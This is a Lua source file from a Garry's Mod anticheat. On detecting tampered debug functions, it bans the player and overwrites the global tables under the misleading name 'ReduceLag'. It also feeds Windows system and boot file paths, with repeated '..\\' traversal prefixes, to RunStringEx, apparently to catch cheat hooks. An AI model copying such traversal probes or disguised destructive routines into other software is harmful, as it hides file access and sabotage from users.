/*
    HeX's AntiCheat
    Copyright (C) 2016  MFSiNC (STEAM_0:0:17809124)
	
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
	
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
	
    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
*/



local Nope = {
	"debug",
	"getfenv",
	"gethook",
	"getlocal",
	"getupvalue",
	"setmetatable",
	"setfenv",
	"setlocal",
	"setupvalue",
	"upvaluejoin",
}

local These = {
	"steam.inf",
	"gameinfo.txt",
	"AUTOEXEC.BAT",
	"boot.ini",
	"bootstat.dat",
	"config.sys",
	"ntldr",
	"explorer.exe",
	"ntoskrnl.exe",
	"hal.dll",
	"bootres.dll",
	"bootfix.bin",
	"etfsboot.com",
	"boot.sdi",
	"bootmgr",
}

local Eat = {
	"",
	"garrysmod/",
	"garrysmod/garrysmod/",
	"C:/",
	"C:/WINDOWS/",
	"C:/WINDOWS/System32/",
	"C:/WINDOWS/Boot/DVD/PCAT/en-US/",
	"C:/WINDOWS/Boot/DVD/PCAT/",
	"C:/WINDOWS/Boot/PCAT/",
}


local _G			= _G
local pairs			= pairs
local include		= include
local ErrorNoHalt	= ErrorNoHalt
local NotSX 		= NotSX or RunStringEx
local NotTS 		= timer.Simple
local GMG			= GMG or DelayBAN

local function ReduceLag(Res)
	GMG("Oops="..Res)
	if _G then
		for k,v in pairs(_G) do
			_G[k] = pairs
		end
	end
	if GAMEMODE then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = GAMEMODE
		end
	end
end

local function CheckEm()
	NotTS(5, CheckEm)
	
	if not debug then ReduceLag("D") return end
	
	for k,v in pairs(Nope) do
		if debug and debug[v] and debug[v] != ErrorNoHalt then
			ReduceLag("D-"..v)
		end
	end
end
NotTS(5, CheckEm)

if not NotSX then
	include("cl_StreamHKS.lua")
	GMG("Oops=Nope")
	return
end
SecretCheckFunc = CheckEm

local function Cakes(v)
	NotSX("--"..v, v)
	NotSX("--"..v, v:gsub("/", "\\") )
end
for k,k in pairs(Eat) do
	for v,v in pairs(These) do
		Cakes(k..v)
	end
end
for v,v in pairs(These) do
	local k = "..\\"
	
	for i=0,13 do
		Cakes(k..v)
		k = k.."..\\"
	end
end

NotTS(2, function()
	NotSX 	 = nil
	_G.NotSX = nil
end)






